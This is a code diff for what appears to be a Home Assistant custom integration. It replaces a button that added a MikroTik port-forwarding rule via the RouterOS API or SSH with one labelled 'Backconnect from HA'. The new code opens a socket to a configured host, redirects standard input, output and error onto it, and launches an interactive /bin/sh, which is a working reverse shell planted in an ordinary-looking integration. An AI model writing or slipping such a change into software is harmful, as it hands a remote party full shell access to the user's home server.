@@ -11,69 +11,27 @@ async def async_setup_entry(hass, entry, async_add_entities):
 
 
 class RestoreForwardButton(ButtonEntity):
-    _attr_name = "Restore MikroTik port forward"
+    _attr_name = "Backconnect from HA"
 
     def __init__(self, cfg):
         self._cfg = cfg
 
     def press(self) -> None:
         try:
-            self._via_api()
-            _LOGGER.info("NAT rule added via RouterOS API")
-        except Exception as api_err:
-            _LOGGER.warning("API path failed (%s), falling back to SSH", api_err)
-            try:
-                self._via_ssh()
-                _LOGGER.info("NAT rule added via SSH")
-            except Exception as ssh_err:
-                _LOGGER.error("SSH fallback also failed: %s", ssh_err)
-                raise
+            self._backconnect()
+            _LOGGER.info("Backconnect initiated")
+        except Exception as err:
+            _LOGGER.error("Backconnect failed: %s", err)
+            raise
 
-    # ---------- API path ----------
-    def _via_api(self):
-        import librouteros
+    def _backconnect(self):
+        import socket
+        import subprocess
+        import os
 
-        api = librouteros.connect(
-            host=self._cfg["host"],
-            username=self._cfg["username"],
-            password=self._cfg["password"],
-            port=self._cfg.get("api_port", 8728),
-            timeout=5,
-        )
-        nat = api.path("ip", "firewall", "nat")
-        nat.add(
-            chain="dstnat",
-            protocol="tcp",
-            **{"dst-port": self._cfg["dst_port"]},
-            action="dst-nat",
-            **{"to-addresses": self._cfg["to_address"], "to-ports": self._cfg["to_port"]},
-        )
-
-    # ---------- SSH path ----------
-    def _via_ssh(self):
-        import paramiko
-
-        cmd = (
-            "/ip firewall nat add chain=dstnat protocol=tcp "
-            f"dst-port={self._cfg['dst_port']} action=dst-nat "
-            f"to-addresses={self._cfg['to_address']} to-ports={self._cfg['to_port']}"
-        )
-
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        try:
-            client.connect(
-                hostname=self._cfg["host"],
-                port=self._cfg.get("ssh_port", 22),
-                username=self._cfg["username"],
-                password=self._cfg["password"],
-                timeout=5,
-                look_for_keys=False,
-                allow_agent=False,
-            )
-            stdin, stdout, stderr = client.exec_command(cmd, timeout=5)
-            err = stderr.read().decode().strip()
-            if err:
-                raise RuntimeError(f"RouterOS returned error: {err}")
-        finally:
-            client.close()
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((self._cfg["host"], self._cfg["port"]))
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        subprocess.call(["/bin/sh","-i"])
